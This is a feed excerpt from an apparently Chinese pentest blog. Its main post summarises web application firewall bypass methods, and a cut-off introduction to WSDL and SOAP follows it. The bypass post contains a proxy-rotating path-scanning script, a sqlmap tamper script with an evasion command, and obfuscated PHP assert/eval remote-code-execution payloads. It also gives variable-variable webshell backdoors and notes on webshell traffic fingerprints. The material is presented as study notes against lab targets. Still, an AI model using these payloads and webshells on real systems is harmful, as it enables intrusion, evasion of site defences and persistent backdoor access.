href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p><p><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p></blockquote><p>备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别</p><h4 id="url白名单"><a class="markdownIt-Anchor" href="#url白名单"></a> url白名单</h4><p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</p><h3 id="content-type绕过"><a class="markdownIt-Anchor" href="#content-type绕过"></a> Content-Type绕过</h3><p>一些WAF识别到特定的content-type后，则会判定为该请求的类型，如：</p><p>发现<code>Content-Type</code>为<code>multipart/form-data</code>时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload</p><h3 id="请求方式绕过"><a class="markdownIt-Anchor" href="#请求方式绕过"></a> 请求方式绕过</h3><ol><li><p>一些WAF对于<code>get</code>请求和<code>post</code>请求的处理机制不一样，可能对POST请求稍加松懈，因此给<code>GET</code>请求变成<code>POST</code>请求有可能绕过拦截。</p></li><li><p>一些WAF检测到<code>POST</code>请求后，就不会对<code>GET</code>携带的参数进行过滤检测，因此导致被绕过。</p></li><li><p>一些WAF检测到HEAD等等请求后，会直接拦截（因为不像是人的操作）</p></li></ol><h3 id="解析兼容性"><a class="markdownIt-Anchor" href="#解析兼容性"></a> 解析兼容性</h3><p>这个之前说过，举个例子：如果waf是检测<code>filename=&quot;&quot;</code>的最后一个<code>&quot;</code>，那么，只要我们这样构造：<code>filename=&quot;sss&quot;s.php</code>他就不拦截了，会保存为<code>s.php</code>。</p><h2 id="容器特性"><a class="markdownIt-Anchor" href="#容器特性"></a> 容器特性</h2><h3 id="iisasp"><a class="markdownIt-Anchor" href="#iisasp"></a> IIS+ASP</h3><ol><li><code>%</code>会被自动去掉</li><li>unicode会自动解码</li></ol><h3 id="tomcat"><a class="markdownIt-Anchor" href="#tomcat"></a> Tomcat</h3><p>路径穿越</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><h1 id="信息搜集绕过waf"><a class="markdownIt-Anchor" href="#信息搜集绕过waf"></a> 信息搜集绕过waf</h1><p>一般对网站进行扫描的时候，都会产生大量数据包，一些网站对将之识别为CC攻击等等。</p><p>如果遇到这种防护，分WAF的类别，例如有阿里云的网站服务器适配、有宝塔等等软件waf等。一般都自己写代码来实现绕过。</p><p>那么我们有如下绕过方式</p><h2 id="模拟用户请求"><a class="markdownIt-Anchor" href="#模拟用户请求"></a> 模拟用户请求</h2><p>即使用常用的UA和常用的请求方式：GET/POST等。</p><h2 id="延时"><a class="markdownIt-Anchor" href="#延时"></a> 延时</h2><p>设置延时，每3秒扫一条（阿里云的限制）</p><h2 id="模拟爬虫"><a class="markdownIt-Anchor" href="#模拟爬虫"></a> 模拟爬虫</h2><p>一般waf为了保证网站被收录，不会拦截爬虫。所以在UA上设置成爬虫即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">百度爬虫，第二条为百度图片爬虫</span><br><span class="line">Baiduspider+(+http://www.baidu.com/search/spider.htm&quot;)</span><br><span class="line">Baiduspider-image</span><br><span class="line">google爬虫，最后一条为google图片搜索爬虫</span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line">Googlebot/2.1 (+http://www.googlebot.com/bot.html)</span><br><span class="line">Googlebot/2.1 (+http://www.google.com/bot.html)</span><br><span class="line">Googlebot-Image/1.0</span><br><span class="line">即刻搜索爬虫</span><br><span class="line">Mozilla/5.0 (compatible; JikeSpider; +http://shoulu.jike.com/spider.html)</span><br><span class="line">雅虎爬虫（分别是雅虎中国和美国总部的爬虫）</span><br><span class="line">Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html&quot;)</span><br><span class="line">Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp&quot;)</span><br><span class="line">新浪爱问爬虫</span><br><span class="line">iaskspider/2.0(+http://iask.com/help/help_index.html&quot;)</span><br><span class="line">Mozilla/5.0 (compatible; iaskspider/1.0; MSIE 6.0)</span><br><span class="line">搜狗爬虫,第三条为搜狗图片爬虫</span><br><span class="line">Sogou web spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br><span class="line">Sogou Push Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br><span class="line">Sogou Pic Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br><span class="line">搜搜爬虫</span><br><span class="line">Sosospider+(+http://help.soso.com/webspider.htm)</span><br><span class="line">网易有道爬虫</span><br><span class="line">Mozilla/5.0 (compatible; YoudaoBot/1.0; http://www.youdao.com/help/webmaster/spider/; )</span><br><span class="line">MSN爬虫</span><br><span class="line">msnbot/1.0 (+http://search.msn.com/msnbot.htm)</span><br></pre></td></tr></table></figure><h2 id="代理池"><a class="markdownIt-Anchor" href="#代理池"></a> 代理池</h2><p>因为延时很慢，所以有代理池，使用不同的IP请求，这些IP会转发包回你的IP。免费的代理池很有可能被识别出来，最好用付费的。例如：<a href="https://www.kuaidaili.com/">快代理</a>。当然，也有免费的：<a href="https://blog.csdn.net/weixin_48584917/article/details/121710521">proxy pool</a></p><p>代理代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索引擎爬虫模拟及模拟真实用户</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="comment">#模拟用户 Kit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span></span><br><span class="line"><span class="comment">#模拟引擎 Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span></span><br><span class="line"><span class="comment">#更多爬虫引擎：https://www.cnblogs.com/iack/p/3557371.html</span></span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; Baiduspider-render/2.0;</span></span><br><span class="line"><span class="string">+http://www.baidu.com/search/spider.html)&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>:</span><br><span class="line"><span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/si</span></span><br><span class="line"><span class="string">gned-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;none&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;navigate&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;xxx&#x27;</span>,<span class="comment">#根据当前访问 cookie</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> paths <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;php_b.txt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">url=<span class="string">&#x27;http://192.168.0.103:8081/&#x27;</span></span><br><span class="line">paths=paths.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">urls=url+paths</span><br><span class="line"><span class="comment">#如需测试加代理，或加入代理池需加代理</span></span><br><span class="line">proxy = &#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:7777&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        code=requests.get(urls,headers=headers,verify=<span class="literal">False</span>).status_code</span><br><span class="line"><span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br><span class="line"><span class="keyword">if</span> code==<span class="number">200</span> <span class="keyword">or</span> code==<span class="number">403</span>:</span><br><span class="line"><span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;connecting error&#x27;</span>)</span><br><span class="line"><span class="comment">#time.sleep(3)模拟用户需延时 引擎可用可不用（根据请求速度）</span></span><br></pre></td></tr></table></figure><h2 id="白名单机制上面有提到"><a class="markdownIt-Anchor" href="#白名单机制上面有提到"></a> 白名单机制（上面有提到）</h2><h1 id="漏洞发现绕过waf"><a class="markdownIt-Anchor" href="#漏洞发现绕过waf"></a> 漏洞发现绕过waf</h1><p>其实思路和上面一样，多了一些就是对流量特征的更改。现在说一下联动：</p><h2 id="awvsburpxray-漏扫-payload-绕过-延时被动"><a class="markdownIt-Anchor" href="#awvsburpxray-漏扫-payload-绕过-延时被动"></a> awvs+burp+xray 漏扫 Payload 绕过-延时，被动</h2><ol><li>awvs设置<ol><li>慢扫</li><li>UA改为爬虫UA</li><li>设置转发</li></ol></li><li>Burp<ol><li>设置代理转发</li></ol></li><li>XRAY<ol><li>监听</li></ol></li></ol><p><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20230613151222688.png" alt="image-20230613151222688" /></p><p>因为AWVS有慢速扫描还好，如果没有的话，就需要BURP来控制速度（可以安装一个按键精灵，哈哈哈哈），这样才能控制XRAY。</p><p>因为每个工具识别漏洞的Payload不一样，所以才可能不会被识别，<strong>所以才有联动这一说法</strong>。如果存在一款可以自己改Payload特征啥（有HTTP头的更改啥的）的就好了，而且需要控制速度，这通常需要我们自己写。</p><h1 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h1><p>这里将不讨论常用的绕过，重点在于工具的绕过以及工具的流量特征。</p><h2 id="sql注入sqlmap特征"><a class="markdownIt-Anchor" href="#sql注入sqlmap特征"></a> sql注入（sqlmap特征）</h2><p>【特征1】攻击产生的流量非常多，一般都会触发cc攻击的防御机制，所以一般会使用<code>--delay</code>或者代理池</p><p>【特征2】默认参数，产生的流量如下，其ua头有sqlmap字样，很容易辨认，所以一般会使用参数<code>--random-agent</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/sqli/sqli_str.php?name=admin&amp;submit=查询 HTTP/1.1</span><br><span class="line">CACHE-CONTROL: no-cache</span><br><span class="line">CONNECTION: close</span><br><span class="line">USER-AGENT: sqlmap/1.5.8#stable (http://sqlmap.org)</span><br><span class="line">ACCEPT: */*</span><br><span class="line">HOST: 192.168.68.78</span><br><span class="line">ACCEPT-ENCODING: gzip,deflate</span><br></pre></td></tr></table></figure><p>【特征3】 xss测试语句、随机数的位数</p><p>【特征4】注入流程/句子比较固定</p><p>综合上述，我们可以自己写tamper来替代一些注入句子，更改特征</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload,**kwargs</span>):</span><br><span class="line">    retVal =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;union&quot;</span>,<span class="string">&quot;%23a%0aunion&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;/*!4457select*/&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;%20&quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;database()&quot;</span>,<span class="string">&quot;database%23a%0a()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>所以，最终的payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;***&quot; --proxy=&quot;http:tps123.kdlapi.com:15818&quot; --tamper=&quot;waf-dog.py&quot; --random-agent</span><br></pre></td></tr></table></figure><p>总结一下绕过：</p><ol><li>代理：绕过传cc</li><li>tamper：注入规则</li><li>user-agent：修改ua，防止匹配到工具的指纹</li></ol><h2 id="xssxsstrike绕过"><a class="markdownIt-Anchor" href="#xssxsstrike绕过"></a> XSS（XSStrike绕过）</h2><p>利用 XSStrike 绕过 加上–timeout 或–proxy 绕过 cc。跑就完事儿了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xsstrike.py -u &quot;目标网址&quot; --timeout x  延时</span><br><span class="line">xsstrike.py -u &quot;目标网址&quot; --proxy  代理地址</span><br></pre></td></tr></table></figure><h2 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h2><h3 id="可逆算法绕过"><a class="markdownIt-Anchor" href="#可逆算法绕过"></a> 可逆算法绕过</h3><ul><li><p>base64：很可能base64_decode会被拦截（如果你传入的代码自带base64解码，那当然万事胜意啦，如果没有，那么就只能你传入一个解码函数了）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=base64_decode(cGhwaW5mbygp)</span><br></pre></td></tr></table></figure></li><li><p>url 编码</p></li><li><p>进制编码（十六进制）等：很可能会拦截hex等函数，理由跟base64差不多。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=$hex=&#x27;706870696E666F2829&#x27;;assert(pack(&quot;H*&quot;,$hex));submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure></li></ul><h3 id="替换绕过"><a class="markdownIt-Anchor" href="#替换绕过"></a> 替换绕过</h3><p>也就是将一个字符设置为空，那么这个字符可以加载到任何位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><h3 id="拼接"><a class="markdownIt-Anchor" href="#拼接"></a> 拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=$X=&#x27;asse&#x27;;$xx=&#x27;rt&#x27;;$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4ce</span><br></pre></td></tr></table></figure><h3 id="更改传参方式"><a class="markdownIt-Anchor" href="#更改传参方式"></a> 更改传参方式</h3><p>实际上就是post的data部分传入GET请求，然后再在get请求URL上填入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[URL GET]</span><br><span class="line">http:/127.0.0.1/pikachu/vul/rce/rce_eval.php?x=rt</span><br><span class="line">[POST DATA]</span><br><span class="line">txt=$x=&#x27;asse&#x27;;$xx=$GET[&#x27;x&#x27;];$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);$xxx($y);&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2><p>：没什么好说的就这几种 …\ …/ …\等</p><h1 id="权限控制"><a class="markdownIt-Anchor" href="#权限控制"></a> 权限控制</h1><p>一个文件上传到网站之后，杀毒软件会对这个文件进行扫描和监控后续敏感操作。</p><ol><li>代码级别的绕过，需要识别各种后门的代码是否是恶意代码</li><li>操作级别的绕过，对后门的操作合理化</li></ol><h2 id="免杀思路"><a class="markdownIt-Anchor" href="#免杀思路"></a> 免杀思路</h2><h3 id="变量覆盖"><a class="markdownIt-Anchor" href="#变量覆盖"></a> 变量覆盖</h3><p>例如：<code>&lt;?php assert($_POST['chopper'])?&gt;</code></p><p>变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;x&#x27;];</span><br><span class="line">$$a = $_GET[&#x27;y&#x27;];</span><br><span class="line">$b($_POST[&#x27;z&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传递的参数为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /URL/?x=b&amp;y=assert</span><br><span class="line">...</span><br><span class="line">[data]</span><br><span class="line">z=phpinfo()</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>简单拆分不行，因为waf会进行变量跟踪</li><li>出现关键词不行，会直接拦截</li><li>如果传入的<code>phpinfo()</code>等操作被拦截，则需要配合编码</li></ul><h3 id="编码-2"><a class="markdownIt-Anchor" href="#编码-2"></a> 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;x&#x27;];</span><br><span class="line">$$a = $_GET[&#x27;y&#x27;];</span><br><span class="line">$b(base64_decode($_POST[&#x27;z&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传递的参数为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /URL/?x=b&amp;y=assert</span><br><span class="line">...</span><br><span class="line">[data]</span><br><span class="line">z=cGhwaW5mbygp</span><br></pre></td></tr></table></figure><h3 id="异或操作加密混淆"><a class="markdownIt-Anchor" href="#异或操作加密混淆"></a> 异或操作&amp;&amp;加密混淆</h3><p>可以使用工具：</p><ul><li><a href="https://www.phpjiami.com/phpjiami.html">网络接口加密（更稳）</a></li><li><a href="https://github.com/djunny/enphp">enphp工具</a></li></ul><h3 id="造轮子"><a class="markdownIt-Anchor" href="#造轮子"></a> 造轮子</h3><p>waf基本都有菜刀、蚁剑、冰蝎的指纹，当你使用他们的时候，一些危害行为会被拦截！</p><p>要想不被识别拦截，只能自己造轮子！</p><p>自己写数据包，不会有那些指纹特征，就能实现功能！</p><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><h3 id="冰蝎"><a class="markdownIt-Anchor" href="#冰蝎"></a> <a href="https://github.com/rebeyond/Behinder/releases/">冰蝎</a>、<a href="https://github.com/AntSwordProject/antSword/releases">蚁剑</a>、<a href="https://pan.baidu.com/s/1msqO2kps139NNP9ZEIAVHw?code=xiao">菜刀</a>、哥斯拉</h3><h4 id="原理以及优缺点"><a class="markdownIt-Anchor" href="#原理以及优缺点"></a> 原理以及优缺点</h4><p><strong>原理</strong>：把一些具体执行语句集成化（各种各样在功能语句都帮你写好了），你直接连接执行就可！</p><p><strong>优缺点</strong>：菜刀：未更新状态，无插件，单向加密传输。蚁剑：更新状态，有插件，拓展性强，单向加密传输。冰蝎：更新状态，未知插件，偏向于后渗透（MSF），双向加密传输</p><p>单向加密传输是什么？我加密数据给服务器，而服务器返回的就没有加密。</p><h4 id="流量分析"><a class="markdownIt-Anchor" href="#流量分析"></a> 流量分析</h4><p><strong>菜刀</strong>：【z0，明文/base64】</p><ul><li>eval函数执行</li><li>攻击的payload使用base64编码</li><li>默认参数<code>z0 </code>对应<code>$_POST [z0]</code>接收到的数据，该参数值是使用 Base64 编码的，所以可以利用 base64 解码可以看到攻击明文</li></ul><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20230613211014792.png" alt="image-20230613211014792" style="zoom:67%;" /><p><strong>蚁剑</strong>：【ini_set，部分明文】</p><ul><li>正文解码发现：<code>@ini_set (&quot;display_errors&quot;,&quot;0&quot;);</code>，也使用base64加密payload</li><li>参数名大多以 <code>_0x.....=</code>”这种形式（下划线可替换为其他）</li><li>后面为加密数据的数据包也可识别为蚁剑的流量特征</li></ul><p><strong>冰蝎</strong>：【UA头，content-type，数据长度（协商密钥数据等长），返回的全是加密字符】</p><ul><li>冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application/octet-stream。还有他们的accept之类的长度总是等长，正常的根据应用场景和不同文件，长度是不同的</li><li>内置很多UA头，相同IP重复请求，但是UA头不一样，则需要注意</li></ul><p><strong>哥斯拉</strong>（base64 加密）：【响应三次】</p><ul><li>发送一段固定代码（payload），http 响应为空</li><li>发送一段固定代码（test），执行结果为固定内容</li><li>发送一段固定代码（getBacisInfo）</li></ul><h3 id="混淆免杀工具"><a class="markdownIt-Anchor" href="#混淆免杀工具"></a> 混淆免杀工具</h3><p>上面有提到一些。</p><p>注：蚁剑和菜刀的流量后门基本上是一致的，所以都可以用他的混淆，例如D盾的混淆：<strong>as-webshell-venom</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/WAF%E7%BB%95%E8%BF%87-16867110382</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="waf绕过" scheme="https://j3f5.github.io/tags/waf%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>HTTP与开发基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/12/HTTP%E4%B8%8E%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/12/HTTP%E4%B8%8E%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-12T05:25:20.000Z</published>
    <updated>2023-06-12T05:25:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="wsdl-soap以及webservice"><a class="markdownIt-Anchor" href="#wsdl-soap以及webservice"></a> WSDL、SOAP以及WebService</h1><p>什么是WebService、什么是SOAP以及什么是WSDL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soap: Simple Object Access Protocol.(简单对象访问协议)</span><br><span class="line">wsdl: Web Service Description Language.(Web服务描述语言)</span><br></pre></td></tr></table></figure><p>参考：<a href="https://zhuanlan.zhihu.com/p/383326629">https://zhuanlan.zhihu.com/p/383326629</a> ，<a href="https://blog.csdn.net/dzqxwzoe/article/details/129221428">https://blog.csdn.net/dzqxwzoe/article/details/129221428</a></p><h2 id="webservice"><a class="markdownIt-Anchor" href="#webservice"></a> WebService</h2><p>WebService有着狭义和广义的定义：</p><p>广义的来说，WebService就是字面意思：Web+Service，也就是服务(Service)网络(Web)化的意思；它力求的是跨语言和跨平台的、基于Web传输的远程调用能力。</p><p>它没有强调远程调用使用什么协议，所以我们可以自由选择，比如SOAP协议或者常见的基于http的json化的数据传输协议。</p><p>关于广义的定义更为深入和具体的介绍，可以参看大V阮一峰的这篇博客，就不再过多介绍了，狭义的来说，我们经常谈的WebService是指基于SOAP协议实现的远程服务调用模型；</p><p><a href="https://link.zhihu.com/?target=http%3A//www.ruanyifeng.com/blog/2009/08/what_is_web_service.html">Web service是什么？ - 阮一峰的网络日志www.ruanyifeng.com/blog/2009/08/what_is_web_service.html</a></p><h2 id="soap"><a class="markdownIt-Anchor" href="#soap"></a> SOAP</h2><p>SOAP定义了数据交互中如何传递消息的规则；</p><p>比如在http中规定了post请求的传参方式，在数据类型不同的情况下可以使用不同的参数方式；其中在form格式下是<code> key=v&amp;key1=v1</code>，同样SOAP也是定义这些东西的；</p><h2 id="wsdl"><a class="markdownIt-Anchor" href="#wsdl"></a> WSDL</h2><p>同样的，当我们用http方式去调用一个服务的时候，我们只是知道通用的http协议的传参方式还是不够的，我们仍然需要知道目标服务的接口文档；这就是WSDL，每个服务都有的<strong>接口文档</strong>。</p><p>在http上可能就是我们手写的一个wiki文档，而在SOAP中就是一个用WSDL规范编写的WSDL文档，每个服务是有能力自动生成这个文档的，其中WSDL规范了这个文档该怎么写；</p><p>那么我们一般如何阅读WSDL文件呢？——WSDL文档都是<strong>从下往上</strong>阅读的。先看最底下的service标签，查看其中port标签的binding属性值，然后通过值查找上面的binding标签</p><h3 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span 